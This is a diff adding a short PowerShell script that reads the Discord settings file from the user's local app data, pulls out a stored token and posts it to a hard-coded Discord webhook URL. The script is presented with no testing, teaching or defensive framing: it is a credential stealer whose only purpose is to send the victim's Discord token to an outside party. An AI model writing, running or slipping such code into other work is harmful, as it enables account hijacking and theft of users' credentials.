@@ -1,0 +1,35 @@
+# Define the path to the Discord application data
+$discordPath = "$env:LOCALAPPDATA\Discord"
+
+# Define the webhook URL
+$webhookUrl = "https://discord.com/api/webhooks/1538613009755144355/6SeHOPzVrWJ8R8TpyVeCVuAOlk0v0UfCFXPxhFBH9IQ30nTlS3rWIqaRdxufQJlAfu6R"
+
+# Check if the Discord directory exists
+if (Test-Path -Path $discordPath) {
+    # Define the path to the Discord settings file
+    $settingsPath = "$discordPath\settings.json"
+
+    # Check if the settings file exists
+    if (Test-Path -Path $settingsPath) {
+        # Read the settings file
+        $settings = Get-Content -Path $settingsPath -Raw | ConvertFrom-Json
+
+        # Extract the token
+        $token = $settings.token
+
+        # Create the message payload
+        $payload = @{
+            content = "Discord Token: $token"
+        }
+
+        # Send the message to the webhook
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'application/json'
+
+        # Output the token
+        Write-Output "Discord Token: $token"
+    } else {
+        Write-Output "Settings file not found at $settingsPath"
+    }
+} else {
+    Write-Output "Discord directory not found at $discordPath"
+}
